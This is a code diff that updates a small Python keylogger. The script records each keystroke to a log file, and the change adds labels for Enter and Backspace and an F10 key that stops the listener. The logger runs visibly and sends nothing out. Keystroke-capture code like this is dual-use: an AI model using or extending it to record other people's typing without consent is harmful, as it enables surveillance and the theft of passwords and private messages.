@@ -6,12 +6,21 @@ def keyPressed(key):
         try:
             char = key.char
             logKey.write(char)
-        except:
-            print("Error getting char")
+        except AttributeError:
+            # Handle special keys
+            if key == keyboard.Key.enter:
+                logKey.write("<Enter>")
+            elif key == keyboard.Key.backspace:
+                logKey.write("<Backspace>")
+            else:
+                print("Unhandled special key")
 
+def on_release(key):
+    # Stop the listener on pressing 'F10'
+    if key == keyboard.Key.f10:
+        return False
 
 if __name__ == '__main__':
-    listener = keyboard.Listener(on_press=keyPressed)
+    listener = keyboard.Listener(on_press=keyPressed, on_release=on_release)
     listener.start()
-    input()
-
+    listener.join()
